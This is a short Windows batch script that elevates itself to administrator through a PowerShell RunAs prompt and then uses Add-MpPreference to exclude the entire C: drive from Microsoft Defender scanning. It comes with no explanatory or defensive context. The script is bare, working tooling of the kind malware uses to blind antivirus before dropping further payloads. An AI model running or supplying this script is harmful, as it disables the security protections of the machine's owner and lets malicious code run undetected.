@echo off 
net session >NUL 2>&1|| powershell Start-Process '%0' -Verb RunAs&& exit /b|| exit /b 
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath 'C:' 
exit
